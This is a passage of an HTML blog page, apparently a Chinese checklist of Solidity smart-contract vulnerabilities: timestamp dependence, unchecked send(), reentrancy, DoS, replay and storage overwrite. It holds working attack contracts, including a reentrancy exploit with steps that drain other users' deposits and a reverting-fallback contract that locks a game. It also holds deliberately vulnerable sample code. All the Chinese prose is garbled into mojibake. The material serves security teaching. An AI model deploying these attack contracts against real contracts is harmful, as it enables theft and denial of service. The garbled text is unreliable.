id="ä¾èµ–äºæ—¶é—´æˆ³-Timestamp-Dependence-Time-manipulation-contractfuzzer"><a href="#ä¾èµ–äºæ—¶é—´æˆ³-Timestamp-Dependence-Time-manipulation-contractfuzzer" class="headerlink" title="ä¾èµ–äºæ—¶é—´æˆ³(Timestamp Dependence/Time manipulation)contractfuzzer"></a>ä¾èµ–äºæ—¶é—´æˆ³(Timestamp Dependence/Time manipulation)<sup><a href="#fn_contractfuzzer" id="reffn_contractfuzzer">contractfuzzer</a></sup></h1><p><img src="/blockchain-æ™ºèƒ½åˆçº¦checklist/1534316701411.png" alt="1534316701411"></p><p>æ”»å‡»è€…å¯ä»¥ä¿®æ”¹åŒºå—çš„æ—¶é—´æˆ³Â±900sä»¥æ­¤è·ç›Šã€‚</p><h1 id="ä¾èµ–äºåŒºå—å·-BlockNumber-Dependency-contractfuzzer"><a href="#ä¾èµ–äºåŒºå—å·-BlockNumber-Dependency-contractfuzzer" class="headerlink" title="ä¾èµ–äºåŒºå—å·(BlockNumber Dependency)contractfuzzer"></a>ä¾èµ–äºåŒºå—å·(BlockNumber Dependency)<sup><a href="#fn_contractfuzzer" id="reffn_contractfuzzer">contractfuzzer</a></sup></h1><p>å’Œä¸Šé¢ä¾èµ–æ—¶é—´æˆ³ç±»ä¼¼</p><h1 id="ExceptionDisordercontractfuzzer"><a href="#ExceptionDisordercontractfuzzer" class="headerlink" title="ExceptionDisordercontractfuzzer"></a>ExceptionDisorder<sup><a href="#fn_contractfuzzer" id="reffn_contractfuzzer">contractfuzzer</a></sup></h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint256 _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] -= _amount;</span><br><span class="line">    etherLeft -= _amount;</span><br><span class="line">    msg.sender.send(_amount);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ç»™å‡ºçš„ä»£ç ä¸­ä½¿ç”¨ send() å‡½æ•°è¿›è¡Œè½¬è´¦ï¼Œå› ä¸ºè¿™é‡Œæ²¡æœ‰éªŒè¯ send() è¿”å›å€¼ï¼Œå¦‚æœmsg.sender ä¸ºåˆçº¦è´¦æˆ· fallback() è°ƒç”¨å¤±è´¥ï¼Œåˆ™ send() è¿”å›falseï¼Œæœ€ç»ˆå¯¼è‡´è´¦æˆ·ä½™é¢å‡å°‘äº†ï¼Œé’±å´æ²¡æœ‰æ‹¿åˆ°ã€‚</p><h1 id="æœªå¤„ç†çš„å¼‚å¸¸-Mishandled-Exceptions-Unchecked-Return-Values-For-Low-Level-Calls-smarter"><a href="#æœªå¤„ç†çš„å¼‚å¸¸-Mishandled-Exceptions-Unchecked-Return-Values-For-Low-Level-Calls-smarter" class="headerlink" title="æœªå¤„ç†çš„å¼‚å¸¸(Mishandled Exceptions/Unchecked Return Values For Low Level Calls)smarter"></a>æœªå¤„ç†çš„å¼‚å¸¸(Mishandled Exceptions/Unchecked Return Values For Low Level Calls)<sup><a href="#fn_smarter" id="reffn_smarter">smarter</a></sup></h1><p>ä¾‹å¦‚åˆçº¦KoETï¼Œæ”»å‡»è€…å¯ä»¥æ§åˆ¶å‡½æ•°è°ƒç”¨æ¬¡æ•°ï¼ˆEVMé™åˆ¶è°ƒç”¨æ·±åº¦ä¸º1024ï¼‰ï¼Œä»è€Œå¯¼è‡´sendå‡½æ•°è°ƒç”¨å¤±è´¥ï¼Œä½†æ˜¯æ¥ä¸‹æ¥çš„ä»£ç ä¼šç»§ç»­æ‰§è¡Œï¼Œè¿™æ ·å‰ä¸€ä¸ªå›½ç‹å°±æ— æ³•å¾—åˆ°æŠ¥é…¬(compensation)ã€‚<br><img src="/blockchain-æ™ºèƒ½åˆçº¦checklist/1535892194599.png" alt="1535892194599"></p><p>Attackerï¼š</p><p><img src="/blockchain-æ™ºèƒ½åˆçº¦checklist/1535891836531.png" alt="1535891836531"></p><p><strong>å¤ç°å¤±è´¥ï¼Œåœ¨Remixä¸­è¿è¡Œé€’å½’ä¼šå´©æºƒï¼Œåœ¨å®é™…è¿è¡Œä¸­ç”±äºGasè¾ƒé«˜ï¼Œæ— æ³•äº¤æ˜“ï¼ˆé¢„ç®—æ‰‹ç»­è´¹å¤§äº30etherï¼‰ã€‚</strong></p><h1 id="é‡å…¥æ¼æ´-Reentrancy-DAO-seebug1"><a href="#é‡å…¥æ¼æ´-Reentrancy-DAO-seebug1" class="headerlink" title="é‡å…¥æ¼æ´(Reentrancy/DAO)seebug1"></a>é‡å…¥æ¼æ´(Reentrancy/DAO)<sup><a href="#fn_seebug1" id="reffn_seebug1">seebug1</a></sup></h1><p>Solidity ä¸­ <code>&lt;address&gt;.transfer()</code>ï¼Œ<code>&lt;address&gt;.send()</code>å’Œ<code>&lt;address&gt;.gas().call.vale()()</code>éƒ½å¯ä»¥ç”¨äºå‘æŸä¸€åœ°å€å‘é€ etherï¼Œä»–ä»¬çš„åŒºåˆ«åœ¨äºï¼š</p><ol><li><code>&lt;address&gt;.transfer()</code><ul><li>å½“å‘é€å¤±è´¥æ—¶ä¼š throw; å›æ»šçŠ¶æ€</li><li>åªä¼šä¼ é€’ 2300 Gas ä¾›è°ƒç”¨ï¼Œé˜²æ­¢é‡å…¥ï¼ˆreentrancyï¼‰</li></ul></li><li><code>&lt;address&gt;.send()</code><ul><li>å½“å‘é€å¤±è´¥æ—¶ä¼šè¿”å› false å¸ƒå°”å€¼</li><li>åªä¼šä¼ é€’ 2300 Gas ä¾›è°ƒç”¨ï¼Œé˜²æ­¢é‡å…¥ï¼ˆreentrancyï¼‰</li></ul></li><li><code>&lt;address&gt;.gas().call.value()()</code><ul><li>å½“å‘é€å¤±è´¥æ—¶ä¼šè¿”å› false å¸ƒå°”å€¼</li><li>ä¼ é€’æ‰€æœ‰å¯ç”¨ Gas è¿›è¡Œè°ƒç”¨ï¼ˆå¯é€šè¿‡ gas(gas_value) è¿›è¡Œé™åˆ¶ï¼‰ï¼Œä¸èƒ½æœ‰æ•ˆé˜²æ­¢é‡å…¥ï¼ˆreentrancyï¼‰</li></ul></li></ol><p>å½“å¤–éƒ¨è´¦æˆ·æˆ–å…¶ä»–åˆçº¦å‘ä¸€ä¸ªåˆçº¦åœ°å€å‘é€etheræ—¶ï¼Œä¼šæ‰§è¡Œè¯¥åˆçº¦çš„fallbackå‡½æ•°ï¼ˆå½“è°ƒç”¨åˆçº¦æ—¶æ²¡æœ‰åŒ¹é…åˆ°å‡½æ•°ï¼Œä¹Ÿä¼šè°ƒç”¨æ²¡æœ‰åå­—çš„fallbackå‡½æ•°â€”â€”The DAOï¼‰ã€‚ä¸”call.value()ä¼šå°†æ‰€æœ‰å¯ç”¨Gasç»™äºˆå¤–éƒ¨è°ƒç”¨ï¼ˆfallbackå‡½æ•°ï¼‰ï¼Œè‹¥åœ¨fallbackå‡½æ•°ä¸­å†è°ƒç”¨withdrawå‡½æ•°ï¼Œåˆ™ä¼šå¯¼è‡´é€’å½’é—®é¢˜ã€‚æ”»å‡»è€…å¯ä»¥éƒ¨ç½²ä¸€ä¸ªæ¶æ„é€’å½’çš„åˆçº¦å°†å…¬å…±é’±åŒ…è¿™ä¸ªåˆçº¦è´¦æˆ·é‡Œçš„Etherå…¨éƒ¨æå‡ºæ¥ã€‚</p><p>å¤ç°ï¼š</p><ol><li>è´¦æˆ·Aéƒ¨ç½²IDMoneyåˆçº¦ï¼Œè´¦æˆ·Béƒ¨ç½²Attackåˆçº¦</li><li>è´¦æˆ·Aè°ƒç”¨IDMoney()æ–¹æ³•ï¼Œå¹¶é™„åŠ 10ether</li><li>è´¦æˆ·Béƒ¨ç½²Attackåˆçº¦ï¼Œé™„åŠ 2ether</li><li>è´¦æˆ·Bè°ƒç”¨Attack.setVictim()æ–¹æ³•ï¼Œè®¾ç½®victimå˜é‡ä¸ºIDMoneyåˆçº¦åœ°å€</li><li>è´¦æˆ·Bè°ƒç”¨Attack.step1()æ–¹æ³•ï¼Œè®¾ç½®amount=1000000000000000000ï¼Œå³åˆçº¦Attackè°ƒç”¨åˆçº¦IDMoney.deposit()æ–¹æ³•</li><li>è´¦æˆ·Bè°ƒç”¨Attack.step2()æ–¹æ³•ï¼Œè®¾ç½®amount=500000000000000000</li><li>è´¦æˆ·Bè°ƒç”¨Attack.stopAttack()æ–¹æ³•ï¼Œè·å¾—IDMoneyçš„æ‰€æœ‰ä½™é¢ï¼ˆåŒ…æ‹¬Açš„å­˜æ¬¾ï¼Œä¸¥æ ¼è¯´æ˜¯åˆçº¦ä¸­é™¤äº†500000000000000000weiçš„ä½™é¢ï¼‰</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract IDMoney&#123;</span><br><span class="line">    address _owner;</span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256) balances;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">IDMoney</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deposit</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">address to, uint256 amount</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balances[msg.sender] &gt;= amount);</span><br><span class="line">        <span class="built_in">require</span>(<span class="keyword">this</span>.balance &gt;= amount);</span><br><span class="line">        log0(bytes32(address(<span class="keyword">this</span>).balance/<span class="number">1e15</span>));</span><br><span class="line">        to.call.value(amount)();</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceof</span>(<span class="params">address to</span>) <span class="title">constant</span> <span class="title">returns</span>(<span class="params">uint256</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balances[to];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    address victim;</span><br><span class="line"></span><br><span class="line">    modifier ownerOnly &#123; <span class="built_in">require</span>(owner == msg.sender); _; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Attack</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123; owner = msg.sender; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®å·²éƒ¨ç½²çš„ IDMoney åˆçº¦å®ä¾‹åœ°å€</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setVictim</span>(<span class="params">address target</span>) <span class="title">ownerOnly</span> </span>&#123; victim = target; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deposit Ether to IDMoney deployed</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">step1</span>(<span class="params">uint256 amount</span>) <span class="title">ownerOnly</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.balance &gt; amount) &#123;</span><br><span class="line">            victim.call.value(amount)(bytes4(keccak256(<span class="string">"deposit()"</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// withdraw Ether from IDMoney deployed</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">step2</span>(<span class="params">uint256 amount</span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        victim.call(bytes4(keccak256(<span class="string">"withdraw(address,uint256)"</span>)), <span class="keyword">this</span>, amount);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// selfdestruct, send all balance to owner</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stopAttack</span>(<span class="params"></span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        selfdestruct(owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">startAttack</span>(<span class="params">uint256 amount</span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        step1(amount);</span><br><span class="line">        step2(amount / <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (msg.sender == victim) &#123;</span><br><span class="line">            <span class="comment">// å†æ¬¡å°è¯•è°ƒç”¨ IDMoney çš„ withdraw å‡½æ•°ï¼Œé€’å½’è½¬å¸</span></span><br><span class="line">            victim.call(bytes4(keccak256(<span class="string">"withdraw(address,uint256)"</span>)), <span class="keyword">this</span>, msg.value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°åˆçº¦IDMoney.withdraw()æ–¹æ³•å·²ç»å­˜åœ¨æ£€æŸ¥è´¦æˆ·ä½™é¢çš„ä»£ç ï¼Œä½†æ˜¯å´æœªèƒ½ç”Ÿæ•ˆï¼ŒåŸå› æ˜¯é€’å½’è°ƒç”¨æ—¶æ²¡æœ‰æ‰§è¡Œåˆ°<code>balances[msg.sender] -= amount;</code>ï¼Œå› æ­¤è°ƒç”¨æ—¶ï¼Œè´¦æˆ·çš„ä½™é¢æ˜¯ä¸å˜çš„ï¼Œè€ŒçœŸæ­£å¯¼è‡´é€’å½’è°ƒç”¨é€€å‡ºçš„æ˜¯<code>require(this.balance &gt;= amount);</code>ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä½•è°ƒç”¨ç»“æŸååˆçº¦è¿˜å‰©ä¸‹amountæ•°é‡çš„ä»¥å¤ªå¸çš„åŸå› ã€‚æœ‰äººä¼šé—®ï¼Œå¦‚æœæŠŠè¿™å¥è¯åˆ æ‰å‘¢ï¼Ÿæˆ‘æœ¬ä»¥ä¸ºåˆçº¦ä¼šæŠ¥é”™ï¼Œä½†æ˜¯å¾ˆé—æ†¾ï¼Œåˆçº¦ä¾ç„¶èƒ½å¤Ÿæ­£å¸¸è¿è¡Œï¼Œå¹¶ä¸”åˆçº¦ä¸­ä¸å†å‰©ä¸‹ä»»ä½•ä»¥å¤ªå¸ã€‚</p><h1 id="DoSæ”»å‡»DoS"><a href="#DoSæ”»å‡»DoS" class="headerlink" title="DoSæ”»å‡»DoS"></a>DoSæ”»å‡»<sup><a href="#fn_DoS" id="reffn_DoS">DoS</a></sup></h1><p>é¢‘ç¹è°ƒç”¨æŸäº›Op(EXTCODESIZEå’ŒSUICIDE)ï¼Œè¿™äº›OpèŠ±è´¹çš„Gaså°ï¼Œä½†æ˜¯éœ€è¦å¤§é‡èµ„æºï¼ˆè®¡ç®—èµ„æºï¼ŒI/Oï¼‰ï¼Œä»¥æ­¤é€ æˆDoSï¼Œå¯¹ä»¥å¤ªåŠåˆçº¦è¿›è¡Œ DoS æ”»å‡»ï¼Œå¯èƒ½å¯¼è‡´ Ether å’Œ Gas çš„å¤§é‡æ¶ˆè€—ï¼Œæ›´ä¸¥é‡çš„æ˜¯è®©åŸæœ¬çš„åˆçº¦ä»£ç é€»è¾‘æ— æ³•æ­£å¸¸è¿è¡Œã€‚</p><p>å¤ç°ï¼š</p><ol><li>è´¦æˆ·Aéƒ¨ç½²PresidentOfCountryåˆçº¦è®¾ç½®_priceä¸º1e18ï¼ˆ1etherï¼‰ã€‚</li><li>è´¦æˆ·Bè°ƒç”¨PresidentOfCountryï¼Œå¹¶é™„åŠ 1etherï¼Œæˆä¸ºPresidentï¼Œprice=2ether</li><li>è´¦æˆ·Céƒ¨ç½²Attackï¼Œè°ƒç”¨start_attack(address(PresidentOfCountry))å¹¶é™„åŠ 2etherï¼Œè´¦æˆ·Cæˆä¸ºPresidentã€‚</li><li>è´¦æˆ·Bè°ƒç”¨PresidentOfCountryï¼Œå¹¶é™„åŠ 4etherï¼Œç”±äºBè¦æˆä¸ºpresident,ï¼Œéœ€è¦è°ƒç”¨PresidentOfCountryåˆçº¦çš„becomePresident()å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šé€šè¿‡ transfer() æŠŠETHé€€å›ç»™ä¹‹å‰çš„presidentï¼Œå³Attackåˆçº¦åœ°å€ï¼Œä½†æ˜¯å› ä¸ºAttackerçš„å›é€€å‡½æ•°revert()æŠ›å¼‚å¸¸==&gt;transfer()æŠ›å¼‚å¸¸==&gt;becomePresident()æŠ›å¼‚å¸¸ï¼Œæ•…è€Œè´¦æˆ·Bæ°¸è¿œæ— æ³•æˆä¸ºpresidentäº†ã€‚</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract PresidentOfCountry &#123;</span><br><span class="line">    address public president;</span><br><span class="line">    uint256 public price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(uint256 _price) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(_price &gt; <span class="number">0</span>);</span><br><span class="line">        price = _price;</span><br><span class="line">        president = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">becomePresident</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">        assert(msg.value &gt;= price);  <span class="comment">// must pay the price to become president</span></span><br><span class="line">        president.transfer(price);   <span class="comment">// we pay the previous president</span></span><br><span class="line">        president = msg.sender;      <span class="comment">// we crown the new president</span></span><br><span class="line">        price = msg.value * <span class="number">2</span>;           <span class="comment">// we double the price to become president</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; revert(); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">start_attack</span>(<span class="params">address _target</span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">        _target.call.value(msg.value)(bytes4(keccak256(<span class="string">"becomePresident()"</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="é‡æ”¾æ”»å‡»blackhat2018"><a href="#é‡æ”¾æ”»å‡»blackhat2018" class="headerlink" title="é‡æ”¾æ”»å‡»blackhat2018"></a>é‡æ”¾æ”»å‡»<sup><a href="#fn_blackhat2018" id="reffn_blackhat2018">blackhat2018</a></sup></h1><p>å¦‚æœåˆçº¦å­˜åœ¨ç›¸åŒçš„ä»£ç ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥ä½¿ç”¨åˆçº¦Aå‡½æ•°çš„å‚æ•°è°ƒç”¨åˆçº¦Bã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ä»˜æ¬¾äººè¦ä¸ºæ”¶æ¬¾äººè½¬è´¦ï¼Œä½†æ˜¯ä»˜æ¬¾äººæ²¡æœ‰è¶³å¤Ÿçš„ETHï¼Œå› æ­¤æ‰¾ä¸€ä¸ªä»£ç†äººï¼Œå¹¶æ”¯ä»˜ä¸€å®šçš„ä»£å¸ä½œä¸ºä»£ç†è´¹</span></span><br><span class="line"><span class="comment"> * @param _from     ä»˜æ¬¾äºº</span></span><br><span class="line"><span class="comment"> * @param _to       æ”¶æ¬¾äºº</span></span><br><span class="line"><span class="comment"> * @param _value    é‡‘é¢</span></span><br><span class="line"><span class="comment"> * @param feeUgt    ä»£ç†è´¹</span></span><br><span class="line"><span class="comment"> * @param _v        sig[0:66] #ç”±ä»˜æ¬¾äººç­¾åï¼Œå³ä»˜æ¬¾äººç¡®è®¤ä»˜é’±</span></span><br><span class="line"><span class="comment"> * @param _r        sig[66:130]</span></span><br><span class="line"><span class="comment"> * @param _s        sig[130:132]</span></span><br><span class="line"><span class="comment"> * å¦‚æœå…¶ä»–åˆçº¦åŒæ ·åŒ…å«TransferProxyå‡½æ•°ï¼Œå¹¶ä¸”å®ç°ç›¸ä¼¼ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥åœ¨Båˆçº¦ä¸Šé‡æ”¾å‡½æ•°å‚æ•°ï¼ŒBåˆçº¦ä¼šæ‰§è¡ŒæˆåŠŸ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transferProxy</span>(<span class="params">address _from, address _to, uint256 _value, uint256 _feeUgt,</span></span></span><br><span class="line"><span class="function"><span class="params">    uint8 _v,bytes32 _r, bytes32 _s</span>) <span class="title">returns</span> (<span class="params">bool</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(balances[_from] &lt; _feeUgt + _value) <span class="keyword">throw</span>;</span><br><span class="line"></span><br><span class="line">    uint256 nonce = nonces[_from];</span><br><span class="line">    bytes32 h = sha3(_from,_to,_value,_feeUgt,nonce);</span><br><span class="line">    <span class="comment">// ecrecover éªŒç­¾å‡½æ•°</span></span><br><span class="line">    <span class="keyword">if</span>(_from != ecrecover(h,_v,_r,_s)) <span class="keyword">throw</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(balances[_to] + _value &lt; balances[_to]</span><br><span class="line">        || balances[msg.sender] + _feeUgt &lt; balances[msg.sender]) <span class="keyword">throw</span>;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    Transfer(_from, _to, _value);</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] += _feeUgt;</span><br><span class="line">    Transfer(_from, msg.sender, _feeUgt);</span><br><span class="line"></span><br><span class="line">    balances[_from] -= _value + _feeUgt;</span><br><span class="line">    nonces[_from] = nonce + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å˜é‡è¦†ç›–varreplace"><a href="#å˜é‡è¦†ç›–varreplace" class="headerlink" title="å˜é‡è¦†ç›–varreplace"></a>å˜é‡è¦†ç›–<sup><a href="#fn_varreplace" id="reffn_varreplace">varreplace</a></sup></h1><p>ä»¥å¦‚ä¸‹ä»£ç ä¸ºä¾‹ï¼ŒSolidityå­˜å‚¨æœºåˆ¶çš„é—®é¢˜ï¼Œpåˆå§‹åŒ–åçš„nameã€mappedAddressåœ°å€ä¼šä¸å˜é‡testAã€testBåœ°å€é‡åˆï¼Œå¯¼è‡´è°ƒç”¨testå‡½æ•°ç»™ç»“æ„ä½“pèµ‹å€¼åï¼Œå˜é‡testAå’ŒtestBçš„å€¼ä¹Ÿä¼šè¢«è¦†ç›–ã€‚</p><p>å¤ç°ï¼š</p><ol><li>è°ƒç”¨TestContract.test()æ–¹æ³•</li><li>æ£€æŸ¥testAå’ŒtestBçš„å€¼ï¼Œå·²è¢«æ”¹å˜</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.0</span>;</span><br><span class="line">contract  TestContract&#123;</span><br><span class="line"></span><br><span class="line">    int public testA;</span><br><span class="line">    address public testB;</span><br><span class="line"></span><br><span class="line">    struct Person &#123;</span><br><span class="line">        int name;</span><br><span class="line">        address mappedAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">int _name, address _mappedAddress</span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        Person p;</span><br><span class="line">        p.name = _name;    <span class="comment">//testAè¢«æ”¹å˜</span></span><br><span class="line">        p.mappedAddress = _mappedAddress;    <span class="comment">//testBè¢«æ”¹å˜</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ç›¸å…³å·¥ä½œ"><a href="#ç›¸å…³å·¥ä½œ" class="headerlink" title="ç›¸å…³å·¥ä½œ"></a>ç›¸å…³å·¥ä½œ</h1><ul><li><p>DASP<sup><a href="#fn_dasp" id="reffn_dasp">dasp</a></sup>æ€»ç»“äº†ä»¥å¤ªåŠåˆçº¦çš„Top10å®‰å…¨æ€§é—®é¢˜</p></li><li><p>luuç­‰äºº<sup><a href="#fn_smarter" id="reffn_smarter">smarter</a></sup>è®¾è®¡ä¸€å¥—åŸºäºç¬¦å·æ‰§è¡Œçš„æ™ºèƒ½åˆçº¦å®‰å…¨å®¡è®¡å·¥å…·oyenteï¼ˆå·²åšè¿‡æ¼”ç¤ºï¼Œç›®å‰å¯ä»¥æ£€æµ‹çš„æ¼æ´æœ‰<strong>æ•´å½¢æº¢å‡ºï¼Œåˆçº¦ä¾èµ–äº¤æ˜“é¡ºåºï¼Œä¾èµ–æ—¶é—´æˆ³çš„æ¼æ´ï¼Œæœªå¤„ç†å¼‚å¸¸å’Œé‡å…¥æ¼æ´</strong>ã€‚</p></li><li><p>Nikolic<sup><a href="#fn_maian" id="reffn_maian">maian</a></sup>ç­‰äººè®¾è®¡äº†ä¸€å¥—ç¬¦å·æ‰§è¡Œæ£€æµ‹æ™ºèƒ½åˆçº¦çš„å·¥å…·MAIANï¼Œè¿™äº›é—®é¢˜åŒ…æ‹¬<strong>åˆçº¦æ°¸ä¹…é”å®šèµ„é‡‘ï¼Œèµ„é‡‘å¯è¢«æ¶æ„ç”¨æˆ·è½¬è´¦ä»¥åŠè¢«ä»»æ„ç”¨æˆ·æ€æ­»</strong>ï¼Œæˆ‘ä»¬é€‰ç”¨äº†34200ä¸ªåˆçº¦ï¼ˆå»é‡å¤åæœ‰2365ä¸ªï¼‰ï¼Œæˆ‘ä»¬æŠ½æ ·è°ƒæŸ¥äº†3759ä¸ªåˆçº¦ï¼Œå¾—åˆ°89%çš„æ­£ç¡®ç‡ã€‚</p></li><li><p>jiangç­‰äºº<sup><a href="#fn_contractfuzzer" 